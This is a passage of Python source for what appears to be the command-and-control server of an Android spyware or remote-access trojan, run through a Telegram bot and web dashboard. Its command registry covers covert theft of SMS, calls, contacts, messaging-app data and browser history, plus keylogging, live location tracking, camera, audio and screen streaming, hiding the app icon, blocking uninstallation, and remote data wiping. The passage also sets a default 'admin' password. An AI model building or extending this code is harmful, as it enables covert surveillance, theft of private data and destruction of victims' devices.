#!/usr/bin/env python3
"""
Abu-Zahra Server - Complete Telegram Bot with Web Dashboard
200+ commands, REST API, getUpdates polling, professional web dashboard.
Uses ONLY aiohttp - no other dependencies besides Python stdlib.
"""

import asyncio
import json
import os
import sys
import time
import uuid
import secrets
import hashlib
import logging
import traceback
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from collections import OrderedDict

import threading

import aiohttp
from aiohttp import web

# ============================================================================
# CORS MIDDLEWARE
# ============================================================================

@web.middleware
async def cors_middleware(request, handler):
    allowed_origins = ['https://alsydyabwalzhra.online', 'http://localhost:8443']
    origin = request.headers.get('Origin', '')
    if request.method == 'OPTIONS':
        response = web.Response(status=204)
        if origin in allowed_origins:
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, X-Device-Token'
            response.headers['Access-Control-Allow-Credentials'] = 'true'
        return response
    response = await handler(request)
    if origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, X-Device-Token'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))
SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
SERVER_DOMAIN = os.environ.get("SERVER_DOMAIN", "https://alsydyabwalzhra.online")
SESSION_SECRET = os.environ.get("SESSION_SECRET", "abu-zahra-secret-key-2025")
DATA_DIR = Path(__file__).parent / "data"

# Firebase Realtime Database
FIREBASE_PROJECT = "studio-7073076148-6afe0"
FIREBASE_RTDB_URL = f"https://{FIREBASE_PROJECT}-default-rtdb.firebaseio.com"
FIREBASE_DB_SECRET = os.environ.get("FIREBASE_DB_SECRET", "")  # من Firebase Console → Project Settings → Service Accounts → Database Secrets

DEVICES_FILE = DATA_DIR / "devices.json"
SESSIONS_FILE = DATA_DIR / "sessions.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
EVENTS_FILE = DATA_DIR / "events.json"
SETTINGS_FILE = DATA_DIR / "settings.json"
LINK_CODES_FILE = DATA_DIR / "link_codes.json"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("abu-zahra")

# ============================================================================
# GLOBAL STATE
# ============================================================================

START_TIME = time.time()
messages_sent = 0
api_hits = 0
tg_offset = 0
_tg_session = None
polling_active = False
# server_settings removed - use load_settings() directly
_processed_update_ids = set()  # منع تكرار معالجة نفس التحديث
_processed_message_keys = set()  # منع تكرار معالجة نفس الرسالة (chat_id:message_id)
_last_message_time = {}  # منع إرسال رسائل مكررة (chat_id -> last_msg_time)
_last_link_code_time = 0  # منع إنشاء أكواد مكررة
_processed_results = set()  # منع إرسال نفس النتيجة مرتين
_pending_messages = {}  # cmd_id -> {"chat_id": int, "message_id": int, "created_at": float}
_message_dedup = {}  # dedup: chat_id:text_hash -> timestamp
_chat_rate_counter = {}  # rate limit: chat_id -> [timestamps]
_data_forward_dedup = {}  # data forward dedup: device_id:type -> timestamp
_data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command -> {last_time, last_hash}

firebase_connected = False  # Tracks Firebase connectivity status
_file_lock = threading.Lock()

# حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
RATE_LIMIT_SECONDS = 1
# حد أدنى بين إنشاء أكواد الربط (بالثواني)
LINK_CODE_RATE_LIMIT = 3
# Per-user rate limiting: max commands per minute
USER_RATE_LIMIT_MAX = 20
USER_RATE_LIMIT_WINDOW = 60  # seconds
_user_command_timestamps = {}  # chat_id -> [timestamps]
# Device state tracking for alerts
_device_last_online_state = {}  # device_id -> bool (last known active state)
_device_last_battery_alert = {}  # device_id -> timestamp of last low-battery alert sent
LOW_BATTERY_THRESHOLD = 15  # percent
# Batch operation tracking
_batch_operations = {}  # batch_id -> {"total": int, "responded": int, "chat_id": int, "msg_id": int, "created_at": float}
DEVICE_OFFLINE_TIMEOUT = 120  # seconds without heartbeat before considering offline

# ============================================================================
# 200+ COMMAND REGISTRY - organized by category
# ============================================================================

COMMAND_REGISTRY = {
    # Data Collection (20)
    "sms":              {"cat": "data",    "cmd": "get_sms",              "desc": "📲 جلب الرسائل SMS",            "emoji": "📲"},
    "calls":            {"cat": "data",    "cmd": "get_calls",            "desc": "📞 جلب سجل المكالمات",          "emoji": "📞"},
    "contacts":         {"cat": "data",    "cmd": "get_contacts",         "desc": "📇 جلب جهات الاتصال",            "emoji": "📇"},
    "location":         {"cat": "data",    "cmd": "get_location",         "desc": "📍 جلب الموقع الجغرافي",        "emoji": "📍"},
    "notifications":    {"cat": "data",    "cmd": "get_notifications",    "desc": "🔔 جلب الإشعارات",              "emoji": "🔔"},
    "apps":             {"cat": "data",    "cmd": "get_apps",             "desc": "📱 جلب التطبيقات المثبتة",      "emoji": "📱"},
    "info":             {"cat": "data",    "cmd": "get_info",             "desc": "ℹ️ معلومات الجهاز",             "emoji": "ℹ️"},
    "battery":          {"cat": "data",    "cmd": "get_battery",          "desc": "🔋 حالة البطارية",              "emoji": "🔋"},
    "gallery":          {"cat": "data",    "cmd": "get_gallery",          "desc": "🖼️ المعرض",                     "emoji": "🖼️"},
    "clipboard":        {"cat": "data",    "cmd": "get_clipboard",        "desc": "📋 الحافظة",                    "emoji": "📋"},
    "all_data":         {"cat": "data",    "cmd": "get_all",         "desc": "📥 جميع البيانات",               "emoji": "📥"},
    "wifi_info":        {"cat": "data",    "cmd": "get_wifi_info",        "desc": "📶 معلومات الواي فاي",          "emoji": "📶"},
    "bluetooth_devices":{"cat": "data",    "cmd": "get_info",        "desc": "🔵 أجهزة البلوتوث",             "emoji": "🔵"},
    "network_info":     {"cat": "data",    "cmd": "get_network_info",     "desc": "🌐 معلومات الشبكة",             "emoji": "🌐"},
    "sim_info":         {"cat": "data",    "cmd": "get_sim_info",         "desc": "📱 معلومات الشريحة",            "emoji": "📱"},
    "storage_info":     {"cat": "data",    "cmd": "get_storage_info",     "desc": "💾 معلومات التخزين",            "emoji": "💾"},
    "installed_apps":   {"cat": "data",    "cmd": "get_installed_apps",   "desc": "📦 التطبيقات المثبتة",          "emoji": "📦"},
    "running_apps":     {"cat": "data",    "cmd": "get_running_apps",     "desc": "⚡ التطبيقات النشطة",           "emoji": "⚡"},
    "calendar":         {"cat": "data",    "cmd": "get_calendar",         "desc": "📅 التقويم",                    "emoji": "📅"},
    "browser_history":  {"cat": "data",    "cmd": "get_browser_history",  "desc": "🌍 سجل المتصفح",               "emoji": "🌍"},

    # Social Media (15)
    "whatsapp":         {"cat": "social",  "cmd": "get_whatsapp",         "desc": "💬 واتساب",                     "emoji": "💬"},
    "telegram_app":     {"cat": "social",  "cmd": "get_telegram",         "desc": "✈️ تليجرام",                    "emoji": "✈️"},
    "instagram":        {"cat": "social",  "cmd": "get_instagram",        "desc": "📷 انستجرام",                   "emoji": "📷"},
    "messenger":        {"cat": "social",  "cmd": "get_messenger",        "desc": "📘 ماسنجر",                     "emoji": "📘"},
    "snapchat":         {"cat": "social",  "cmd": "get_snapchat",         "desc": "👻 سناب شات",                   "emoji": "👻"},
    "tiktok":           {"cat": "social",  "cmd": "get_tiktok",           "desc": "🎵 تيك توك",                    "emoji": "🎵"},
    "twitter":          {"cat": "social",  "cmd": "get_twitter",          "desc": "🐦 تويتر / X",                  "emoji": "🐦"},
    "viber":            {"cat": "social",  "cmd": "get_viber",            "desc": "💜 فايبر",                      "emoji": "💜"},
    "signal":           {"cat": "social",  "cmd": "get_signal",           "desc": "🟢 سيجنال",                     "emoji": "🟢"},
    "facebook":         {"cat": "social",  "cmd": "get_facebook",         "desc": "📘 فيسبوك",                     "emoji": "📘"},
    "whatsapp_status":  {"cat": "social",  "cmd": "get_whatsapp",  "desc": "📝 حالات واتساب",              "emoji": "📝"},
    "whatsapp_stories": {"cat": "social",  "cmd": "get_whatsapp", "desc": "📖 قصص واتساب",                "emoji": "📖"},
    "telegram_channels":{"cat": "social",  "cmd": "get_telegram","desc": "📺 قنوات تليجرام",             "emoji": "📺"},
    "instagram_stories":{"cat": "social",  "cmd": "get_instagram","desc": "📸 قصص انستجرام",              "emoji": "📸"},
    "youtube":          {"cat": "social",  "cmd": "get_tiktok",          "desc": "▶️ يوتيوب",                     "emoji": "▶️"},

    # Remote Control (40)
    "ping":             {"cat": "control", "cmd": "ping",                 "desc": "📡 فحص الاتصال",               "emoji": "📡"},
    "vibrate":          {"cat": "control", "cmd": "vibrate",              "desc": "📳 اهتزاز",                     "emoji": "📳"},
    "ring":             {"cat": "control", "cmd": "ring",                 "desc": "🔔 رنين",                      "emoji": "🔔"},
    "screenshot":       {"cat": "control", "cmd": "screenshot",           "desc": "📸 لقطة شاشة",                 "emoji": "📸"},
    "front_camera":     {"cat": "control", "cmd": "front_camera",         "desc": "📷 كاميرا أمامية",             "emoji": "📷"},
    "back_camera":      {"cat": "control", "cmd": "back_camera",          "desc": "📷 كاميرا خلفية",              "emoji": "📷"},
    "record_audio":     {"cat": "control", "cmd": "record_audio",         "desc": "🎙️ تسجيل صوتي",               "emoji": "🎙️"},
    "record_video":     {"cat": "control", "cmd": "record_screen",         "desc": "🎬 تسجيل فيديو",               "emoji": "🎬"},
    "lock_phone":       {"cat": "control", "cmd": "lock_phone",           "desc": "🔒 قفل الهاتف",                "emoji": "🔒"},
    "unlock_phone":     {"cat": "control", "cmd": "unlock_phone",         "desc": "🔓 فتح الهاتف",                "emoji": "🔓"},
    "reboot":           {"cat": "control", "cmd": "reboot",               "desc": "🔄 إعادة تشغيل",              "emoji": "🔄"},
    "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
    "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
    "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
    "set_ringtone":     {"cat": "control", "cmd": "set_ringtone",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
    "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
    "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
    "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
    "enable_bluetooth": {"cat": "control", "cmd": "enable_bluetooth",     "desc": "🔵 تشغيل البلوتوث",            "emoji": "🔵"},
    "disable_bluetooth":{"cat": "control", "cmd": "disable_bluetooth",    "desc": "❌ إيقاف البلوتوث",            "emoji": "❌"},
    "enable_mobile_data":{"cat": "control","cmd": "enable_mobile_data",   "desc": "📶 تشغيل بيانات الجوال",       "emoji": "📶"},
    "disable_mobile_data":{"cat":"control","cmd": "disable_mobile_data",  "desc": "📵 إيقاف بيانات الجوال",       "emoji": "📵"},
    "enable_hotspot":   {"cat": "control", "cmd": "enable_hotspot",       "desc": "📡 تشغيل نقطة الاتصال",        "emoji": "📡"},
    "disable_hotspot":  {"cat": "control", "cmd": "disable_hotspot",      "desc": "📵 إيقاف نقطة الاتصال",        "emoji": "📵"},
    "airplane_on":      {"cat": "control", "cmd": "airplane_on",          "desc": "✈️ وضع الطيران - تشغيل",      "emoji": "✈️"},
    "airplane_off":     {"cat": "control", "cmd": "airplane_off",         "desc": "📱 وضع الطيران - إيقاف",      "emoji": "📱"},
    "auto_rotate_on":   {"cat": "control", "cmd": "set_auto_rotate",       "desc": "🔄 الدوران التلقائي - تشغيل", "emoji": "🔄"},
    "auto_rotate_off":  {"cat": "control", "cmd": "set_auto_rotate",      "desc": "🔒 الدوران التلقائي - إيقاف", "emoji": "🔒"},
    "torch_on":         {"cat": "control", "cmd": "torch_on",             "desc": "🔦 تشغيل الكشاف",              "emoji": "🔦"},
    "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
    "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
    "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
    "show_notification":{"cat": "control", "cmd": "show_notification",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
    "open_url":         {"cat": "control", "cmd": "open_url",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
    "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
    "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
    "block_number":     {"cat": "control", "cmd": "block_number",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
    "unblock_number":   {"cat": "control", "cmd": "unblock_number",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},

    # App Management (20)
    "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
    "close_app":        {"cat": "apps",    "cmd": "close_app",            "desc": "❌ إغلاق تطبيق",               "emoji": "❌"},
    "install_app":      {"cat": "apps",    "cmd": "install_app",          "desc": "📥 تثبيت تطبيق",               "emoji": "📥"},
    "uninstall_app":    {"cat": "apps",    "cmd": "uninstall_app",        "desc": "🗑️ حذف تطبيق",                "emoji": "🗑️"},
    "block_app":        {"cat": "apps",    "cmd": "block_app",            "desc": "🚫 حظر تطبيق",                "emoji": "🚫"},
    "unblock_app":      {"cat": "apps",    "cmd": "unblock_app",          "desc": "✅ إلغاء حظر تطبيق",           "emoji": "✅"},
    "clear_app_data":   {"cat": "apps",    "cmd": "clear_app_data",       "desc": "🧹 مسح بيانات تطبيق",         "emoji": "🧹"},
    "force_stop_app":   {"cat": "apps",    "cmd": "force_stop_app",       "desc": "⛔ إيقاف قسري",               "emoji": "⛔"},
    "app_info":         {"cat": "apps",    "cmd": "get_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
    "app_usage":        {"cat": "apps",    "cmd": "get_running_apps",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
    "screen_time":      {"cat": "apps",    "cmd": "get_app_usage",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
    "app_permissions":  {"cat": "apps",    "cmd": "get_info",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
    "enable_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
    "disable_app":      {"cat": "apps",    "cmd": "close_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
    "list_blocked":     {"cat": "apps",    "cmd": "get_info",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
    "clear_cache":      {"cat": "apps",    "cmd": "clear_app_data",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
    "update_app":       {"cat": "apps",    "cmd": "install_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
    "launch_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
    "kill_app":         {"cat": "apps",    "cmd": "force_stop_app",             "desc": "💀 إنهاء تطبيق",               "emoji": "💀"},
    "app_cache":        {"cat": "apps",    "cmd": "clear_app_data",            "desc": "💾 كاش التطبيقات",             "emoji": "💾"},

    # File Management (25)
    "list_files":       {"cat": "files",   "cmd": "list_files",           "desc": "📂 عرض الملفات",               "emoji": "📂"},
    "get_file":         {"cat": "files",   "cmd": "get_file",             "desc": "📄 جلب ملف",                  "emoji": "📄"},
    "download_file":    {"cat": "files",   "cmd": "get_file",        "desc": "⬇️ تحميل ملف",                "emoji": "⬇️"},
    "list_downloads":   {"cat": "files",   "cmd": "list_files",       "desc": "📥 مجلد التحميلات",            "emoji": "📥"},
    "list_dcim":        {"cat": "files",   "cmd": "list_files",            "desc": "📸 مجلد DCIM",                "emoji": "📸"},
    "list_music":       {"cat": "files",   "cmd": "list_files",           "desc": "🎵 مجلد الموسيقى",            "emoji": "🎵"},
    "list_videos":      {"cat": "files",   "cmd": "list_files",          "desc": "🎬 مجلد الفيديوهات",          "emoji": "🎬"},
    "list_documents":   {"cat": "files",   "cmd": "list_files",       "desc": "📁 مجلد المستندات",            "emoji": "📁"},
    "list_whatsapp":    {"cat": "files",   "cmd": "list_files",  "desc": "💬 ملفات واتساب",             "emoji": "💬"},
    "list_telegram_files":{"cat":"files",  "cmd": "list_files",  "desc": "✈️ ملفات تليجرام",            "emoji": "✈️"},
    "send_contacts_backup":{"cat":"files", "cmd": "send_backup_contacts", "desc": "📇 نسخة جهات الاتصال",          "emoji": "📇"},
    "send_sms_backup":  {"cat": "files",   "cmd": "send_backup_sms",      "desc": "📲 نسخة الرسائل",              "emoji": "📲"},
    "send_calls_backup":{"cat": "files",   "cmd": "send_backup_calls",    "desc": "📞 نسخة المكالمات",            "emoji": "📞"},
    "send_whatsapp_backup":{"cat":"files", "cmd": "send_backup_whatsapp", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
    "send_full_backup": {"cat": "files",   "cmd": "send_backup_all",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
    "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
    "rename_file":      {"cat": "files",   "cmd": "rename_file",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
    "copy_file":        {"cat": "files",   "cmd": "copy_file",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
    "move_file":        {"cat": "files",   "cmd": "move_file",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
    "create_folder":    {"cat": "files",   "cmd": "create_folder",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
    "get_folder_size":  {"cat": "files",   "cmd": "get_folder_size",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
    "search_files":     {"cat": "files",   "cmd": "search_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
    "recent_files":     {"cat": "files",   "cmd": "recent_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
    "file_info":        {"cat": "files",   "cmd": "file_info",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
    "zip_files":        {"cat": "files",   "cmd": "zip_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},

    # Security & Admin (15)
    "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
    "factory_reset":    {"cat": "security","cmd": "factory_reset",        "desc": "⚠️ إعادة ضبط المصنع",         "emoji": "⚠️"},
    "show_app":         {"cat": "security","cmd": "show_app",             "desc": "👁️ إظهار أيقونة التطبيق",     "emoji": "👁️"},
    "hide_app":         {"cat": "security","cmd": "hide_app",             "desc": "🙈 إخفاء أيقونة التطبيق",     "emoji": "🙈"},
    "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
    "set_pin":          {"cat": "security","cmd": "change_passcode",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
    "remove_pin":       {"cat": "security","cmd": "change_passcode",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
    "enable_biometric": {"cat": "security","cmd": "enable_biometric",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
    "disable_biometric":{"cat": "security","cmd": "disable_biometric",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
    "anti_uninstall_on":{"cat": "security","cmd": "anti_uninstall_on",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
    "anti_uninstall_off":{"cat":"security","cmd": "anti_uninstall_off",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
    "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
    "check_root":       {"cat": "security","cmd": "get_info",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
    "set_screen_lock":  {"cat": "security","cmd": "lock_phone",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
    "remove_screen_lock":{"cat":"security","cmd":"remove_screen_lock",    "desc": "🔓 إزالة قفل الشاشة",         "emoji": "🔓"},

    # Monitoring (20)
    "keylogger_start":  {"cat": "monitor", "cmd": "keylogger_start",      "desc": "⌨️ بدء تسجيل المفاتيح",        "emoji": "⌨️"},
    "keylogger_stop":   {"cat": "monitor", "cmd": "keylogger_stop",       "desc": "⏹️ إيقاف تسجيل المفاتيح",     "emoji": "⏹️"},
    "get_keylogger":    {"cat": "monitor", "cmd": "get_keylogger",        "desc": "📥 جلب بيانات لوحة المفاتيح",   "emoji": "📥"},
    "screen_record_start":{"cat":"monitor","cmd":"screen_record_start",   "desc": "🔴 بدء تسجيل الشاشة",         "emoji": "🔴"},
    "screen_record_stop":{"cat": "monitor","cmd": "stop_screen",   "desc": "⏹️ إيقاف تسجيل الشاشة",       "emoji": "⏹️"},
    "clipboard_monitor_start":{"cat":"monitor","cmd":"clipboard_monitor_start","desc":"📋 بدء مراقبة الحافظة","emoji":"📋"},
    "clipboard_monitor_stop":{"cat":"monitor","cmd":"clipboard_monitor_stop","desc":"⏹️ إيقاف مراقبة الحافظة","emoji":"⏹️"},
    "get_clipboard_log":{"cat": "monitor", "cmd": "get_clipboard",    "desc": "📋 سجل الحافظة",               "emoji": "📋"},
    "wifi_monitor_start":{"cat": "monitor", "cmd": "get_wifi_info",  "desc": "📡 بدء مراقبة الواي فاي",     "emoji": "📡"},
    "wifi_monitor_stop":{"cat": "monitor", "cmd": "get_wifi_info",   "desc": "⏹️ إيقاف مراقبة الواي فاي",   "emoji": "⏹️"},
    "app_monitor_start":{"cat": "monitor", "cmd": "get_running_apps",    "desc": "📱 بدء مراقبة التطبيقات",      "emoji": "📱"},
    "app_monitor_stop": {"cat": "monitor", "cmd": "get_running_apps",     "desc": "⏹️ إيقاف مراقبة التطبيقات",   "emoji": "⏹️"},
    "get_app_log":      {"cat": "monitor", "cmd": "get_running_apps",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
    "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
    "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
    "geo_add":          {"cat": "monitor", "cmd": "get_location",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
    "geo_remove":       {"cat": "monitor", "cmd": "get_location",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
    "geo_list":         {"cat": "monitor", "cmd": "get_location",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
    "sms_monitor":      {"cat": "monitor", "cmd": "get_sms",          "desc": "📲 مراقبة الرسائل",            "emoji": "📲"},
    "call_monitor":     {"cat": "monitor", "cmd": "get_calls",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},

    # System Settings (15)
    "set_language":     {"cat": "syssettings", "cmd": "set_language",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
    "set_timezone":     {"cat": "syssettings", "cmd": "set_timezone",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
    "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
    "set_timer":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
    "set_reminder":     {"cat": "syssettings", "cmd": "set_alarm",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
    "enable_dev_mode":  {"cat": "syssettings", "cmd": "enable_dev_mode",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
    "disable_dev_mode": {"cat": "syssettings", "cmd": "disable_dev_mode", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
    "enable_usb_debug": {"cat": "syssettings", "cmd": "enable_usb_debug", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
    "disable_usb_debug":{"cat": "syssettings", "cmd": "disable_usb_debug","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
    "dns_change":       {"cat": "syssettings", "cmd": "dns_change",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
    "proxy_set":        {"cat": "syssettings", "cmd": "proxy_set",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
    "apn_settings":     {"cat": "syssettings", "cmd": "apn_settings",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
    "nfc_on":           {"cat": "syssettings", "cmd": "nfc_on",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
    "nfc_off":          {"cat": "syssettings", "cmd": "nfc_off",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
    "auto_update_on":   {"cat": "syssettings", "cmd": "auto_update_on",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
    "auto_update_off":  {"cat": "syssettings", "cmd": "auto_update_off",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},

    # Streaming (15)
    "start_screen_stream": {"cat": "streaming", "cmd": "start_screen_stream", "desc": "🖥️ بث الشاشة", "emoji": "🖥️"},
    "stop_screen_stream":  {"cat": "streaming", "cmd": "stop_screen_stream",  "desc": "⏹️ إيقاف بث الشاشة", "emoji": "⏹️"},
    "start_camera_stream": {"cat": "streaming", "cmd": "start_camera_stream", "desc": "📷 بث الكاميرا", "emoji": "📷"},
    "stop_camera_stream":  {"cat": "streaming", "cmd": "stop_camera_stream",  "desc": "⏹️ إيقاف بث الكاميرا", "emoji": "⏹️"},
    "switch_camera":       {"cat": "streaming", "cmd": "switch_camera",       "desc": "🔄 تبديل الكاميرا", "emoji": "🔄"},
    "start_audio_stream":  {"cat": "streaming", "cmd": "start_audio_stream",  "desc": "🎙️ بث الصوت", "emoji": "🎙️"},
    "stop_audio_stream":   {"cat": "streaming", "cmd": "stop_audio_stream",   "desc": "⏹️ إيقاف بث الصوت", "emoji": "⏹️"},
    "get_stream_status":   {"cat": "streaming", "cmd": "get_stream_status",   "desc": "📊 حالة البث", "emoji": "📊"},
    "set_stream_quality":  {"cat": "streaming", "cmd": "set_stream_quality",  "desc": "⚙️ جودة البث", "emoji": "⚙️"},
    "enable_torch":        {"cat": "streaming", "cmd": "enable_torch",        "desc": "🔦 الكشاف", "emoji": "🔦"},
    "pause_stream":        {"cat": "streaming", "cmd": "pause_stream",        "desc": "⏸️ إيقاف مؤقت", "emoji": "⏸️"},
    "resume_stream":       {"cat": "streaming", "cmd": "resume_stream",       "desc": "▶️ استئناف", "emoji": "▶️"},
    "stop_all_streams":    {"cat": "streaming", "cmd": "stop_all_streams",    "desc": "⏹️ إيقاف كل البث", "emoji": "⏹️"},
    "get_stream_capabilities": {"cat": "streaming", "cmd": "get_stream_capabilities", "desc": "📋 إمكانيات البث", "emoji": "📋"},
}

# ============================================================================
# DATA HELPERS
# ============================================================================

# Module-level IP -> device_id mapping (for upload identification)
_ip_device_map = {}
# Module-level latest frame cache (accessible from upload handler at module level)
_latest_frames_module = {}
# Module-level JPEG stream task tracking
_jpeg_stream_tasks_module = {}
_jpeg_stream_info = {}

def _get_real_ip(request):
    """Extract real client IP from request, handling reverse proxy headers."""
    forwarded = request.headers.get("X-Forwarded-For", "").strip()
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("X-Real-IP", "").strip()
    if real_ip:
        return real_ip
    return request.remote or ""

def ensure_data_dir():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    defaults = {
        DEVICES_FILE: [],
        SESSIONS_FILE: [],
        COMMANDS_FILE: [],
        EVENTS_FILE: [],
        SETTINGS_FILE: {
            "admin_password": "admin",
            "sync_interval": 300,
            "location_interval": 60,
            "auto_location": True,
            "auto_sync": True,
            "language": "ar",
            "notifications": True,
            "keylogger": False,
            "sim_detect": False,
            "wifi_monitor": False,
            "geofences": [],
        },
        LINK_CODES_FILE: [],
    }
    for fpath, default in defaults.items():
        if not fpath.exists():
            fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))


def load_json(path, default=None):
    try:
        if path.exists():
            return json.loads(path.read_text())
    except Exception as exc:
        log.error("Failed to load %s: %s", path, exc)
    return default if default is not None else []


def save_json(path, data):
    with _file_lock:
        try:
            path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
        except Exception as exc:
            log.error("Failed to save %s: %s", path, exc)


def append_event(event, details=None, level="info"):
    events = load_json(EVENTS_FILE, [])
    events.append({
        "time": datetime.now(timezone.utc).isoformat(),
        "event": event,
        "details": details or {},
        "level": level,
    })
    if len(events) > 2000:
        events = events[-2000:]
    save_json(EVENTS_FILE, events)


def load_settings():
    return load_json(SETTINGS_FILE, {
        "admin_password": "admin",
        "sync_interval": 300,
        "location_interval": 60,
        "auto_location": True,
        "auto_sync": True,
        "language": "ar",
        "notifications": True,
        "keylogger": False,
        "sim_detect": False,
        "wifi_monitor": False,
        "geofences": [],
    })


def save_settings_data(settings):
    save_json(SETTINGS_FILE, settings)


def ts():
